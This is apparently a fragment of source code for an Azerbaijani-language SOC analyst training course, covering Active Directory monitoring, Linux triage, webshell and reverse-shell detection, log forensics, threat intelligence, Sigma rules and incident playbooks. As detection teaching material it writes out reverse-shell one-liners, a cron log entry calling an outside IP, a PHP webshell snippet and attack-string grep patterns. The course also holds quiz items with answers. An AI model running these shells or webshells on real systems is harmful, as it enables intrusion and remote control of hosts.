<div class="tip">AD təhqiqatında <b>timeline</b> qurmaq əsasdır: ilkin giriş (phishing/exploit) → kəşfiyyat (BloodHound) → credential access (LSASS/Kerberoast) → lateral movement (PtH/PsExec) → privilege escalation → domain dominance (DCSync/Golden Ticket) → impact. Hər mərhələdə hansı Event ID-lərin yarandığını bil.</div>`},
{ title: "AD müdafiəsi və monitorinq", html: R`
<h3>Monitorinq prioritetləri</h3>
<ul><li>Həssas qrup üzvlük dəyişiklikləri (Domain/Enterprise Admins) — 4728/4732/4756</li>
<li>4769 Kerberoasting nümunələri (bir hesab, çox SPN, RC4)</li>
<li>Sysmon 10: lsass.exe-yə giriş</li>
<li>4662: DCSync əlaməti (Replicating Directory Changes, qeyri-DC hesab)</li>
<li>Yeni servis (7045) / scheduled task (4698) kritik serverlərdə</li>
<li>Anormal logon nümunələri (impossible travel, qeyri-iş saatı, service hesabı interactive logon)</li>
<li>1102: log silinməsi; EDR tamper</li>
<li>Honeypot/canary hesablarına toxunuş</li></ul>
<h3>Hardening</h3>
<ul><li><b>Tiered admin model</b> (Tier 0/1/2) — DC-lərə yalnız Tier 0 hesablar giriş</li>
<li><b>LAPS</b> — lokal admin parollarını unikallaşdırır (lateral movement-i çətinləşdirir)</li>
<li>Güclü servis hesabı parolları + gMSA; krbtgt parolunu mütəmadi iki dəfə rotasiya</li>
<li>NTLM-i mümkün qədər söndür; SMB signing; LDAP signing</li>
<li>Protected Users qrupu, Credential Guard</li><li>Minimum delegation; lazımsız SPN-ləri sil</li>
<li>Patch (Zerologon, PrintNightmare və s.)</li><li>Attack Surface Reduction qaydaları</li></ul>
<h3>Faydalı alətlər</h3>
<p><b>BloodHound</b> (müdafiəçi də hücum yollarını görmək üçün istifadə edir), <b>PingCastle/Purple Knight</b> (AD təhlükəsizlik auditi), <b>Microsoft Defender for Identity</b> (ATA varisi — AD hücumlarını aşkarlayır).</p>

lessons: [
{ title: "Linux kompromis göstəriciləri və triage", html: R`
<h3>Canlı Linux triage əmrləri</h3>
<pre># İstifadəçilər və giriş
cat /etc/passwd | awk -F: '$3==0'       # UID 0 hesablar
last -20 ; lastb -20                     # son giriş/uğursuz giriş
w ; who                                   # aktiv sessiyalar
cat /etc/sudoers; ls /etc/sudoers.d/

# Proseslər və şəbəkə
ps auxf                                   # proses ağacı
ss -tulpanp                               # bütün bağlantı + proses
ls -la /proc/*/exe 2>/dev/null | grep deleted   # silinmiş-amma-işləyən binary

# Persistence
crontab -l; cat /etc/crontab; ls -la /etc/cron.*
ls -la /etc/systemd/system/ ~/.config/systemd/user/
cat ~/.bashrc ~/.profile /etc/profile.d/*
cat ~/.ssh/authorized_keys               # icazəsiz açar?
systemctl list-units --type=service --state=running

# Fayl anomaliyaları
find / -mtime -2 -type f 2>/dev/null     # son 2 gündə dəyişən
find /tmp /dev/shm /var/tmp -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null   # SUID (privesc)
find / -name ".*" -type f 2>/dev/null | grep -vE '^/(home|root|etc)'  # gizli fayllar</pre>
<h3>Şübhə əlamətləri</h3>
<ul><li>/tmp, /dev/shm-dan işləyən binary-lər</li><li>Yüksək CPU (cryptominer)</li>
<li>Qeyri-adi outbound bağlantılar (reverse shell, C2)</li><li>Silinmiş amma işləyən proseslər</li>
<li>Yeni SUID binary-lər, yeni cron/systemd, dəyişmiş authorized_keys</li>
<li>Dəyişdirilmiş sistem binary-ləri (rootkit): <code>rpm -Va</code> / <code>debsums</code> ilə yoxla</li>
<li>Tarixçə izləri: <code>~/.bash_history</code> (hücumçu çox vaxt silir və ya <code>unset HISTFILE</code> edir — boş history özü şübhədir)</li></ul>`},
{ title: "Reverse shell və webshell aşkarlaması", html: R`
<h3>Reverse shell</h3>
<p>Hədəf hücumçuya "geri" bağlanır (firewall adətən outbound-a icazə verir). Nümunələr:</p>
<pre>bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
nc -e /bin/sh 10.0.0.99 4444
python3 -c 'import socket,subprocess,os;...'
</pre>
<p><b>Aşkarlama:</b> <code>/dev/tcp</code> istifadəsi; <code>nc/ncat</code> ilə <code>-e</code>; bash/sh-in şəbəkə bağlantısı (auditd/Sysmon-for-Linux + şəbəkə); veb server istifadəçisinin (www-data) shell/python/nc başlatması; qeyri-adi outbound yüksək port.</p>
<h3>Webshell</h3>
<p>Veb qovluğa yüklənmiş zərərli skript uzaqdan əmr icrasına imkan verir.</p>
<ul><li><b>PHP nümunələri:</b> <code>&lt;?php system($_GET['cmd']); ?&gt;</code>, <code>eval($_POST[...])</code>, <code>passthru</code>, <code>base64_decode</code>, <code>assert</code>.</li>
<li><b>Aşkarlama (fayl):</b> veb kök qovluqda yeni/dəyişmiş .php/.aspx/.jsp; obfuscated PHP; YARA qaydaları; <code>find /var/www -name "*.php" -mtime -7</code>.</li>
<li><b>Aşkarlama (proses):</b> apache2/nginx/php-fpm/w3wp.exe-nin <code>sh/cmd/whoami/id</code> başlatması — güclü siqnal.</li>
<li><b>Aşkarlama (log):</b> access.log-da eyni .php faylına təkrar POST/GET + <code>cmd=</code> parametri; qeyri-adi User-Agent.</li></ul>
<h3>auditd (Linux audit)</h3>
<p>Linux-da proses/əmr/fayl girişini detallı loglayır. Nümunə qayda: icra olunan əmrləri izlə. Loglar: <code>/var/log/audit/audit.log</code>, <code>ausearch</code>/<code>aureport</code> ilə sorğu. Sysmon for Linux də alternativdir.</p>`},
{ title: "Veb server log forensikası", html: R`
<h3>Access log anatomy (Combined Log Format)</h3>
<pre>203.0.113.50 - - [12/Mar/2026:03:14:55 +0000] "GET /admin?id=1 HTTP/1.1" 200 1534 "http://ref" "Mozilla/5.0..."
    IP        user  [vaxt]              metod URL  proto  status bytes referer  User-Agent</pre>
<h3>Hücum nümunələrini tapmaq (grep)</h3>
<pre># SQL injection əlamətləri
grep -iE "union.*select|' or |information_schema|sleep\(|benchmark\(" access.log

# XSS
grep -iE "<script|%3Cscript|javascript:|onerror=" access.log

# Path traversal / LFI
grep -iE "\.\./|%2e%2e|/etc/passwd|boot.ini|php://|data://" access.log

# Command injection
grep -iE ";id|;whoami|%3Bid|\|whoami|&&|\\\$\(|nc " access.log

# Skaner alətləri (User-Agent)
grep -iE "sqlmap|nikto|nmap|gobuster|dirbuster|wpscan|masscan|python-requests|curl/" access.log

# Webshell girişi
grep -iE "\.php\?cmd=|shell|c99|r57|b374k|wso" access.log

# Ən çox 404/skan edən IP
awk '$9==404 {print $1}' access.log | sort | uniq -c | sort -nr | head</pre>
<h3>Təhlil strategiyası</h3>
<ol><li>Status kodları paylanması (çoxlu 404 = enumeration; 500 = injection; 200 şübhəli yola = uğur)</li>
<li>Top IP-lər və onların davranışı</li><li>Qeyri-adi User-Agent-lər</li>
<li>POST-lar (login, upload, webshell)</li><li>Vaxt korrelyasiyası (hücum pəncərəsi)</li>
<li>Uğurlu hücumu (200 + həssas yol) ayır</li></ol>
<div class="tip">IIS logları fərqli formatdadır (W3C, boşluqla ayrılmış, <code>C:\inetpub\logs\LogFiles\</code>). Sahələr fərqlidir amma məntiq eynidir. Veb hücum forensikasında əsas sual: "hansı sorğular UĞURLU oldu (200) və nə əldə etdilər?"</div>`},
{ title: "Container və cloud-native əsasları (SOC)", html: R`
<p>Müasir infrastruktur getdikcə container və cloud-dadır. L2 analitik əsasları bilməlidir.</p>
<h3>Docker/Container təhlükəsizliyi</h3>
<ul><li><b>Image riski:</b> zərərli/zəif public image-lər (Docker Hub). Image skanı (Trivy, Grype).</li>
<li><b>Container escape:</b> privileged container, mount edilmiş docker.sock, kernel exploit ilə host-a çıxış.</li>
<li><b>Əlamətlər:</b> container içindən host fayl sisteminə giriş, qeyri-adi proses, cryptominer (yüksək CPU), container-dan outbound C2.</li>
<li><b>Loglar:</b> Docker/containerd logları, Kubernetes audit log, Falco (runtime security, container üçün "Sysmon").</li></ul>
<h3>Kubernetes qısa</h3>
<ul><li><b>Pod, Node, Namespace, Service Account</b>. API server mərkəzdir.</li>
<li><b>Hücumlar:</b> açıq API server/dashboard, zəif RBAC, sirlər (secrets) sızması, kompromis pod-dan lateral movement.</li>
<li><b>Monitorinq:</b> K8s audit logları, anomal <code>kubectl exec</code>, yeni privileged pod.</li></ul>
<h3>Cloud (AWS/Azure/GCP) əsas log mənbələri</h3>
<table><tr><th>Platforma</th><th>Əsas audit log</th></tr>
<tr><td>AWS</td><td>CloudTrail (API), VPC Flow Logs, GuardDuty (detection), S3 access</td></tr>
<tr><td>Azure/Entra</td><td>Azure Activity, Entra ID Sign-in/Audit, Defender for Cloud</td></tr>
<tr><td>GCP</td><td>Cloud Audit Logs, VPC Flow</td></tr></table>
<h3>Tipik cloud hücumları</h3>
<ul><li>Sızmış access key (GitHub-a push edilmiş!) → resurs sui-istifadəsi (crypto mining)</li>
<li>Over-privileged IAM rolları, privilege escalation</li><li>Açıq S3 bucket (data leak)</li>
<li>SSRF ilə metadata credential oğurluğu (169.254.169.254)</li><li>MFA olmayan root/admin girişi</li>
<li>Konfiqurasiya dəyişiklikləri (logların söndürülməsi, yeni hesab)</li></ul>
<div class="note">Cloud-da "identity yeni perimetrdir". CloudTrail/Entra sign-in logları ilə anomal API çağırışları, impossible travel, yeni region istifadəsi, logların söndürülməsi (CloudTrail StopLogging!) izlənir. Cloud SOC getdikcə daha vacibdir.</div>`}
],

{ t: "Reverse shell tap", d: R`<p>auditd/əmr logundan:</p><pre>Mar 12 14:22:01 web01 CROND: (www-data) CMD (bash -c 'bash -i >& /dev/tcp/45.33.12.9/4444 0>&1')</pre>`, q: "Hücumçunun IP ünvanı hansıdır?", ans: ["45.33.12.9"], hint: "/dev/tcp/IP/PORT formatı.", sol: "45.33.12.9 (port 4444 — Metasploit default). www-data cron vasitəsilə reverse shell işlədib → webshell/RCE sonrası persistence. ATT&CK: T1059.004 + T1053.003 (cron persistence). Addım: cron qeydini sil, www-data-nın necə kompromis olunduğunu tap (webshell?), 45.33.12.9-u blokla, host-u araşdır, web kök qovluqda yeni .php faylları yoxla." },
{ t: "Webshell girişini tap", d: R`<p>nginx access.log:</p><pre>203.0.113.7 "POST /uploads/avatar.php HTTP/1.1" 200

{ title: "Analiz mühiti və təhlükəsizlik qaydaları", html: R`
<div class="warn"><b>ÇOX VACİB — qızıl qaydalar:</b>

<li>Həssas faylı VirusTotal-a <b>YÜKLƏMƏ</b> — yalnız hash-i axtar (yüklənən fayllar başqalarına əlçatan olur, məxfilik pozulur).</li>

{ title: "Dinamik analiz və sandbox", html: R`

<p>IOC-ları paylaşarkən təsadüfən kliklənməsin deyə "defang" edilir: <code>http://evil.com</code> → <code>hxxp://evil[.]com</code>, <code>1.2.3.4</code> → <code>1[.]2[.]3[.]4</code>, <code>bad@mail.com</code> → <code>bad[@]mail[.]com</code>. CyberChef-də "Defang URL/IP" resepti var.</p>

lessons: [
{ title: "Threat Intelligence növləri və dövrü", html: R`
<h3>CTI nədir?</h3>
<p>Təhdidlər haqqında <b>təhlil edilmiş, kontekstli</b> məlumat — qərar verməyə kömək edir. Sadəcə IOC siyahısı deyil; "kim, niyə, necə, nə ilə" sualına cavabdır.</p>
<h3>Dörd səviyyə</h3>
<table><tr><th>Növ</th><th>Auditoriya</th><th>Nümunə</th></tr>
<tr><td><b>Strategic</b></td><td>Rəhbərlik</td><td>Sənaye təhdid trendləri, geosiyasi risk, uzunmüddətli</td></tr>
<tr><td><b>Operational</b></td><td>IR/SOC menecmenti</td><td>Konkret kampaniya, aktor, gözlənilən hücum</td></tr>
<tr><td><b>Tactical</b></td><td>SOC analitikləri</td><td>TTP-lər, aşkarlama imkanları</td></tr>
<tr><td><b>Technical</b></td><td>Alətlər/SOC</td><td>IOC-lar (IP, hash, domen) — qısaömürlü</td></tr></table>
<h3>Threat Intelligence dövrü</h3>
<ol><li><b>Direction/Planning:</b> hansı suallara cavab lazımdır (requirements)</li>
<li><b>Collection:</b> məlumat toplama (OSINT, feeds, dark web, daxili telemetriya)</li>
<li><b>Processing:</b> normalizasiya, tərcümə, deduplication</li>
<li><b>Analysis:</b> kontekst, qiymətləndirmə, nəticə</li>
<li><b>Dissemination:</b> uyğun auditoriyaya çatdırmaq (hesabat, feed, alert)</li>
<li><b>Feedback:</b> faydalı oldumu? Təkmilləşdirmə</li></ol>
<h3>IOC vs IOA</h3>
<ul><li><b>IOC</b> (Indicator of Compromise) — kompromis <i>olduğunu</i> göstərən artefakt (hash, IP). Reaktiv.</li>
<li><b>IOA</b> (Indicator of Attack) — hücum <i>davranışı/niyyəti</i> (məs. "proses LSASS-a girir"). Proaktiv, davamlı.</li></ul>`},
{ title: "Təhdid aktorları və atribusiya", html: R`
<h3>Aktor növləri</h3>
<table><tr><th>Növ</th><th>Motivasiya</th><th>İmkan</th></tr>
<tr><td><b>Nation-state / APT</b></td><td>Casusluq, sabotaj, geosiyasi</td><td>Çox yüksək, resurslu, səbirli</td></tr>
<tr><td><b>Cybercrime (organized)</b></td><td>Maliyyə (ransomware, fraud)</td><td>Yüksək, peşəkar (RaaS)</td></tr>
<tr><td><b>Hacktivist</b></td><td>İdeoloji/siyasi</td><td>Dəyişkən (DDoS, defacement, leak)</td></tr>
<tr><td><b>Insider</b></td><td>İntiqam, pul, səhlənkarlıq</td><td>Daxili giriş — təhlükəli</td></tr>
<tr><td><b>Script kiddie</b></td><td>Əyləncə, status</td><td>Aşağı (hazır alətlər)</td></tr>
<tr><td><b>Cyber-mercenary</b></td><td>Pul (sifarişlə)</td><td>Yüksək</td></tr></table>
<h3>APT adlandırma</h3>
<p>Fərqli təchizatçılar eyni qrupu fərqli adlandırır: APT29 = Cozy Bear = Midnight Blizzard (Microsoft) = NOBELIUM. CrowdStrike heyvan adları (Bear=Rusiya, Panda=Çin, Kitten=İran, Chollima=Şimali Koreya), Mandiant APTxx, Microsoft hava hadisələri. <b>MITRE ATT&CK Groups</b> bu adları əlaqələndirir.</p>
<h3>Atribusiya (kim etdi?)</h3>
<p>Çətin və diqqət tələb edir. Göstəricilər: TTP-lər, malware ailələri, infrastruktur, dil/iş saatları, hədəf seçimi, kod oxşarlıqları. <b>Yanlış bayraq (false flag)</b> riski var — aktorlar qəsdən başqasına bənzəyə bilər. SOC L2 adətən atribusiyadan çox <b>aşkarlama və cavaba</b> fokuslanır; atribusiya CTI komandasının işidir.</p>
<div class="note"><b>Diamond Model:</b> hər hadisəni 4 təpə ilə təsvir et: <b>Adversary</b> (kim), <b>Capability</b> (nə ilə — malware/alət), <b>Infrastructure</b> (hardan — C2/domen), <b>Victim</b> (kimə). Bir təpəni bilsən, digərlərini kəşf edə bilərsən (pivoting). CTI təhlilinin əsas çərçivəsidir.</div>`},
{ title: "TI mənbələri və pivoting", html: R`
<h3>OSINT və feed mənbələri</h3>
<ul><li><b>Pulsuz feeds:</b> abuse.ch (URLhaus, ThreatFox, MalwareBazaar, Feodo Tracker), AlienVault OTX, Spamhaus, Emerging Threats, CISA alerts</li>
<li><b>Platformalar:</b> MISP, VirusTotal (Intelligence), MITRE ATT&CK</li>
<li><b>Hesabatlar:</b> Mandiant, CrowdStrike, Microsoft, Cisco Talos, Unit 42, Recorded Future, sektoral ISAC-lar</li>
<li><b>OSINT:</b> Shodan, Censys, passive DNS, WHOIS, crt.sh, GitHub (sızmış açarlar)</li></ul>
<h3>Pivoting (bir göstəricidən digərlərinə)</h3>
<p>Bir IOC-dan başlayıb əlaqəli infrastruktur/nümunələri tapmaq:</p>
<ul><li>Domen → passive DNS → həmin IP-də digər domenlər → həmin aktorun digər C2-ləri</li>
<li>Hash → VT → eyni imza/kod olan digər nümunələr → malware ailəsi</li>
<li>SSL sertifikat/JA3 → eyni barmaq izli digər serverlər (Shodan/Censys)</li>
<li>Email → istifadə olunan infrastruktur → kampaniya</li></ul>
<h3>Analitik mülahizə (ACH)</h3>
<p>Analysis of Competing Hypotheses — bir nəticəyə atılmamaq üçün bir neçə fərziyyəni dəlillərlə qiymətləndirmək. Confirmation bias-dan qaçmaq üçün. Qiymətləndirmədə etibarlılıq dilindən istifadə et: "yüksək etibarla", "orta etibarla", "aşağı etibarla" (admiralty scale).</p>
<div class="tip">TI-ni həddindən artıq IOC feed-ə endirmə. Dəyərli TI "bu bizə necə aiddir, nə etməliyik?" sualına cavab verir. Pis TI: kontekstsiz 10,000 IP bloklamaq (FP partlayışı). Yaxşı TI: "bu aktor bizim sektoru hədəfləyir, bu TTP-ni işlədir, bu detection-ı qur."</div>`},
{ title: "TI-nin SOC-da tətbiqi və proaktiv müdafiə", html: R`
<h3>TI SOC iş axınına necə qoşulur?</h3>
<ul><li><b>Alert zənginləşdirmə:</b> IOC-ları avtomatik TI ilə yoxlamaq (SOAR). "Bu IP məlum C2-dirmi?"</li>
<li><b>Prioritetləşdirmə:</b> məlum aktor/kampaniya ilə əlaqəli alertlər daha yüksək prioritet</li>
<li><b>Bloklama:</b> yüksək-etibarlı IOC-ları firewall/proxy/EDR-ə</li>
<li><b>Detection engineering:</b> TTP-lərdən Sigma/detection qaydaları</li>
<li><b>Threat hunting:</b> "bu aktor bu texnikanı işlədir — bizdə izi varmı?" (L3)</li>
<li><b>Proaktiv müdafiə:</b> gözlənilən təhdidlərə qarşı hardening</li></ul>
<h3>Threat modeling və prioritetləşdirmə</h3>
<ul><li><b>Threat-informed defense:</b> müdafiəni real təhdidlərə görə qur (ATT&CK mapping).</li>
<li><b>MITRE ATT&CK Navigator:</b> hansı texnikaları izləyə bildiyini (coverage) xəritələ, boşluqları tap.</li>
<li><b>Crown jewels:</b> ən kritik aktivləri müəyyən et, onlara qarşı təhdidlərə fokuslan.</li></ul>
<h3>CTI çərçivələri</h3>
<ul><li><b>Cyber Kill Chain</b> — hücum mərhələləri</li><li><b>MITRE ATT&CK</b> — TTP taksonomiyası</li>
<li><b>Diamond Model</b> — hadisə təhlili</li><li><b>F3EAD</b> — Find, Fix, Finish, Exploit, Analyze, Disseminate (hərbi IR/TI dövrü)</li>
<li><b>Pyramid of Pain</b> — IOC dəyəri</li></ul>
<div class="note">Müsahibə: "Diamond Model-i izah et" və ya "APT ilə cybercrime fərqi nədir?" tez-tez soruşulur. APT = səbirli, hədəfli, casusluq, resurslu (dövlət); cybercrime = sürətli, maliyyə məqsədli, geniş. Hər ikisi ciddi, amma fərqli davranış və detection yanaşması tələb edir.</div>`}
],

{
id: "l2-detection", level: "L2", title: "Detection Engineering: Sigma, qaydalar və ATT&CK",
intro: "Alertləri istehlak etməkdən onları yaratmağa keçid. Sigma qaydaları, detection məntiqi və tuning.",
lessons: [
{ title: "Detection engineering əsasları", html: R`
<p>Detection engineering — aşkarlama qaydalarını <b>dizayn etmək, yazmaq, test etmək və idarə etmək</b> prosesidir. L2-nin L3-ə doğru böyüməsinin əsas yoludur.</p>
<h3>Yaxşı detection-un xüsusiyyətləri</h3>
<ul><li><b>Dəqiq:</b> real təhlükəni tutur (az FN)</li><li><b>Spesifik:</b> az FP yaradır</li>
<li><b>Davamlı:</b> davranışa (TTP) əsaslanır, asanlıqla bypass edilmir</li>
<li><b>Sənədləşdirilmiş:</b> nə tutur, niyə, necə cavab vermək</li>
<li><b>Test edilmiş:</b> həm işləyir, həm səs-küy yaratmır</li></ul>
<h3>Detection yaratma dövrü</h3>
<ol><li><b>Fərziyyə:</b> hansı təhdid/TTP-ni tutmaq istəyirik? (ATT&CK texnikası)</li>
<li><b>Data mənbəyi:</b> bunu görmək üçün hansı log lazımdır? (log source)</li>
<li><b>Məntiq:</b> hansı nümunə təhlükəni göstərir?</li>
<li><b>Yaz:</b> qaydanı yaz (Sigma/SIEM dili)</li>
<li><b>Test:</b> emulate et (Atomic Red Team) — tutursanmı?</li>
<li><b>Tune:</b> FP-ləri azalt (kontekst, whitelist, threshold)</li>
<li><b>Sənədləşdir və deploy</b></li></ol>
<h3>Detection piramidası / "alert quality"</h3>
<p>Balans: çox geniş qayda = FP seli (alert fatigue); çox dar qayda = FN (buraxılan təhlükə). Məqsəd yüksək <b>fidelity</b> (etibarlılıq) ilə geniş <b>coverage</b> (əhatə).</p>
<div class="note"><b>Detection as Code:</b> müasir komandalar qaydaları versiya nəzarətində (Git) saxlayır, test edir, CI/CD ilə deploy edir. Qayda bir kod artefaktı kimi idarə olunur.</div>`},
{ title: "Sigma — universal detection dili", html: R`
<p><b>Sigma</b> SIEM-dən asılı olmayan, YAML əsaslı detection qaydası formatıdır. "Detection üçün YARA". Bir dəfə yaz, müxtəlif SIEM-lərə çevir (sigmac/pySigma).</p>
<pre>title: Suspicious PowerShell Encoded Command
id: a1b2c3d4-...
status: experimental
description: Base64 ilə kodlaşdırılmış PowerShell icrası
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: SOC Mentor
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-enc'
      - '-EncodedCommand'
      - 'FromBase64String'
  condition: selection
falsepositives:
  - Legitimate admin scripts using encoded commands
level: high
tags:
  - attack.execution
  - attack.t1059.001</pre>
<h3>Əsas Sigma elementləri</h3>
<ul><li><b>logsource:</b> hansı log (product, category, service)</li>
<li><b>detection:</b> selection blokları + condition</li>
<li><b>modifiers:</b> <code>contains</code>, <code>startswith</code>, <code>endswith</code>, <code>all</code>, <code>re</code> (regex), <code>base64</code></li>
<li><b>condition:</b> məntiq (<code>selection and not filter</code>, <code>1 of them</code>, <code>all of selection*</code>)</li>
<li><b>falsepositives, level, tags (ATT&CK)</b></li></ul>
<h3>Sigma repozitoriyası</h3>
<p>SigmaHQ GitHub-da minlərlə hazır qayda var — öyrənmək və uyğunlaşdırmaq üçün əla mənbə. Bir qaydanı oxuyub nəyi, niyə tutduğunu anlamaq güclü təlimdir.</p>`},
{ title: "Detection məntiqi və nümunələr", html: R`
<h3>Detection yanaşmaları</h3>
<table><tr><th>Yanaşma</th><th>Nümunə</th><th>Zəiflik</th></tr>
<tr><td><b>Atomic</b> (tək göstərici)</td><td>Məlum pis hash/IP</td><td>Asan bypass (dəyişir)</td></tr>
<tr><td><b>Behavioral</b> (davranış)</td><td>Word → PowerShell başlatması</td><td>Daha davamlı</td></tr>
<tr><td><b>Correlation</b> (əlaqələndirmə)</td><td>50 uğursuz + 1 uğurlu login/5dəq</td><td>Tuning tələb edir</td></tr>
<tr><td><b>Anomaly/baseline</b></td><td>İstifadəçi ilk dəfə DC-yə RDP</td><td>Baseline lazımdır, FP riski</td></tr>
<tr><td><b>Threshold</b></td><td>10 dəqiqədə 100+ fayl dəyişdi (ransomware)</td><td>Həddin düzgün seçimi</td></tr></table>
<h3>Faydalı detection ideyaları (ATT&CK ilə)</h3>
<ul><li><b>T1059.001:</b> powershell + (-enc / IEX / DownloadString / hidden)</li>
<li><b>T1003.001:</b> lsass.exe-yə qeyri-adi proses girişi (Sysmon 10)</li>
<li><b>T1547.001:</b> Run registry açarına yazılış (Sysmon 13)</li>
<li><b>T1053.005:</b> schtasks yaradılması / Event 4698</li>
<li><b>T1036:</b> System32-dən kənar yolda sistem proses adı (svchost, lsass)</li>
<li><b>T1055:</b> CreateRemoteThread / qeyri-adi process memory yazma</li>
<li><b>T1486 (ransomware):</b> qısa müddətdə kütləvi fayl dəyişikliyi + shadow copy silmə (vssadmin delete shadows)</li>
<li><b>Parent-child anomaliyaları:</b> office→shell, webserver→shell, svchost yanlış parent</li></ul>
<h3>Atomic Red Team ilə test</h3>
<p>Atomic Red Team — ATT&CK texnikalarını təhlükəsiz emulate edən pulsuz test kitabxanası. Bir texnikanı lab-da icra et → detection-ın tutub-tutmadığını yoxla. Purple teaming-in əsasıdır.</p>
<div class="warn">Atomic testləri yalnız öz lab mühitində icra et. İstehsalat sistemlərində icazəsiz icra problem yaradar.</div>`},
{ title: "Tuning, FP idarəetməsi və detection ömürü", html: R`
<h3>False Positive tuning</h3>
<p>Hər yeni qayda ilkin olaraq səs-küy yaradır. Tuning — aşkarlamanı kor etmədən FP-ləri azaltmaq.</p>
<ul><li><b>Kontekst əlavə et:</b> "powershell -enc" + <i>amma yalnız</i> qeyri-admin istifadəçidən / qeyri-IT host-dan</li>
<li><b>Whitelist:</b> təsdiqlənmiş legitim alətlər/hesablar (ehtiyatla — hücumçu whitelist-i sui-istifadə edə bilər)</li>
<li><b>Threshold/aggregation:</b> tək hadisə yox, nümunə (N dəfə / vaxt)</li>
<li><b>Enrichment:</b> asset kritikliyi, istifadəçi rolu, TI ilə zənginləşdir</li>
<li><b>Allowlist-i sənədləşdir:</b> nə, niyə icazəlidir</li></ul>
<h3>Detection metrikaları</h3>
<ul><li><b>True/False Positive nisbəti</b> (precision)</li><li><b>Coverage</b> (ATT&CK Navigator-da nə qədər texnika)</li>
<li><b>Alert həcmi</b> (analitik yükü)</li><li><b>Time to detect</b></li></ul>
<h3>Detection-ın ömrü</h3>
<p>Qaydalar "canlı"dır: mühit dəyişir, hücumçular bypass tapır, yeni TTP-lər çıxır. Müntəzəm nəzərdən keçir: hələ işləyirmi? Hələ lazımdırmı? FP artdımı? Yeni bypass varmı?</p>
<h3>SOAR və avtomatlaşdırma (qısa)</h3>
<p><b>SOAR</b> (Security Orchestration, Automation and Response) təkrarlanan işləri avtomatlaşdırır: alert zənginləşdirmə (IOC-u TI-də yoxla), məlum FP-ni avtomatik bağla, host izolyasiyası, ticket yaratma. L2/L3 playbook-ları (avtomatlaşdırma iş axınları) dizayn edir. Məqsəd: analitiki təkrarlıq işdən azad edib real təhlilə fokuslamaq.</p>
<div class="note">Müsahibə: "FP çox olan qaydanı necə tune edərsən?" Güclü cavab: əvvəl FP-lərin ortaq xüsusiyyətini tap (hansı host/user/proses), sonra kontekst/threshold/allowlist əlavə et — amma aşkarlamanı tamamilə kor etmədən. Hər dəyişikliyi sənədləşdir və test et.</div>`

lessons: [
{ title: "IR playbook-ları (runbook)", html: R`
<p><b>Playbook</b> — konkret insident növü üçün addım-addım prosedur. Təzyiq altında struktur verir, heç bir addım unudulmur, nəticələr ardıcıl olur.</p>
<h3>Ümumi playbook strukturu</h3>
<ol><li><b>Trigger/scope:</b> bu playbook nə vaxt işə düşür</li>
<li><b>Severity/prioritet təyini</b></li>
<li><b>Detection & Analysis addımları</b> (nə yoxlamalı, hansı sorğular)</li>
<li><b>Containment addımları</b> (nəyi izolyasiya etməli)</li>
<li><b>Eradication & Recovery</b></li>
<li><b>Communication</b> (kimi xəbərdar etməli, eskalasiya yolu)</li>
<li><b>Sənədləşdirmə və lessons learned</b></li></ol>
<h3>Ən çox istifadə olunan playbook-lar</h3>
<table><tr><th>İnsident növü</th><th>Əsas addımlar</th></tr>
<tr><td><b>Phishing</b></td><td>Başlıq/URL/əlavə analizi → təsirlənən istifadəçiləri tap → məktubu karantinə al → IOC blok → kliklənibsə host/credential yoxla</td></tr>
<tr><td><b>Malware/EDR alert</b></td><td>Proses ağacı → IOC → sandbox → host izolyasiyası → eradication → root cause</td></tr>
<tr><td><b>Ransomware</b></td><td>Dərhal izolyasiya → yayılmanı dayandır → şifrələmə vektorunu tap → backup yoxla → bərpa → forensika</td></tr>
<tr><td><b>Compromised account</b></td><td>Parol sıfırla/deaktiv → sessiyaları ləğv et → fəaliyyət audit → lateral movement yoxla → MFA</td></tr>
<tr><td><b>Brute force</b></td><td>Mənbə IP blok → uğurlu login yoxla → hesab qoru → ekspozisiyanı düzəlt</td></tr>
<tr><td><b>Data exfiltration</b></td><td>Trafik analizi → nə getdi → mənbəni tap → DLP → hüquqi/compliance</td></tr>
<tr><td><b>Insider threat</b></td><td>Diqqətli, HR/hüquq ilə → fəaliyyət audit → dəlil qoru</td></tr></table>
<div class="tip">Playbook-lar sərt deyil — rəhbərlik üçün çərçivədir. Hər insident unikaldır; playbook başlanğıc nöqtəsidir, kritik düşüncəni əvəz etmir.</div>`},
{ title: "Phishing insidentinin tam analizi", html: R`
<p>Phishing L1/L2-nin ən çox qarşılaşdığı insidentdir. Tam iş axını:</p>
<h3>1. Email analizi</h3>
<ul><li><b>Başlıqlar:</b> From, Return-Path, Reply-To uyğunluğu; Received zənciri; Authentication-Results (SPF/DKIM/DMARC); göndərən IP reputasiyası</li>
<li><b>Məzmun:</b> təcililik/sosial mühəndislik, display name vs real domen, qrammatika</li>
<li><b>URL-lər:</b> real href vs mətn; defang et; urlscan.io/VT-də analiz (REAL brauzerdə AÇMA); yönləndirmə zəncirini izlə</li>
<li><b>Əlavələr:</b> fayl tipi; hash → VT; makro varsa olevba; sandbox</li></ul>
<h3>2. Scope (əhatə dairəsi)</h3>
<ul><li>Eyni/oxşar məktubu <b>başqa kim aldı</b>? (email gateway/SIEM-də göndərən/mövzu/URL üzrə axtar)</li>
<li>Neçə nəfər <b>açdı</b>? <b>Kliklədi</b>? (proxy/email loglarında URL)</li>
<li><b>Credential daxil etdimi?</b> (saxta login səhifəsi)</li>
<li><b>Əlavəni işlətdi?</b> (EDR-də host fəaliyyəti)</li></ul>
<h3>3. Containment & Response</h3>
<ul><li>Məktubu <b>bütün poçt qutularından</b> karantinə al (purge)</li>
<li>Göndərən/domen/URL/hash-i <b>blok siyahısına</b> (email gateway, proxy, firewall, EDR)</li>
<li>Kliklənibsə: təsirlənən host-u yoxla/izolyasiya, credential daxil edilsə parol sıfırla + sessiya ləğv + MFA</li>
<li>İstifadəçiləri xəbərdar et (farkındalıq)</li></ul>
<h3>4. Sənədləşdirmə</h3>
<p>IOC-lar, təsirlənən istifadəçilər, görülən tədbirlər, timeline, ATT&CK (T1566). Lessons: necə keçdi filtri? Fərkındalıq lazımdırmı?</p>
